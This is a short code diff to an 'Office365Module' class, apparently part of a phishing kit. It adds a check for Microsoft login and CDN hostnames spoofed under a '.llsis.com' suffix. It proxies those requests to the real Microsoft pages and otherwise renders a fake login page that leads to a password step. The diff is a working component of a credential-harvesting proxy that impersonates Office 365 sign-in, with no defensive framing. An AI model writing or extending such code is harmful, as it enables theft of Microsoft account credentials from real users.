@@ -54,8 +54,32 @@ class Office365Module(BaseModule):
         """Logging method for debugging"""
         print(f"[Office365Module] {message}")
 
+    def _is_ms_host(self):
+        """Return True if current request host is one of the Microsoft hosts we spoof (login.live.com.*, etc.)."""
+        host = request.host or ""
+        suffix = ".llsis.com"
+        if not host.endswith(suffix):
+            return False
+        # strip suffix to get the real Microsoft host
+        base = host[:-len(suffix)]
+        ms_hosts = [
+            "login.live.com",
+            "account.live.com",
+            "login.microsoftonline.com",
+            "account.microsoft.com",
+            "aadcdn.msftauth.net",
+            "logincdn.msftauth.net",
+            "static2.sharepointonline.com",
+        ]
+        return base in ms_hosts
 
     def login(self):
+        if self._is_ms_host():
+            # Forward straight to Microsoft for real page when using spoof host
+            suffix = ".llsis.com"
+            real_host = request.host[:-len(suffix)]
+            target_url = f"https://{real_host}{request.full_path or '/'}"
+            return self._proxy_to_microsoft(target_url)
         template = self.env.get_template('login.html')
         return template.render(next_url='/password', hostname=request.host)
 
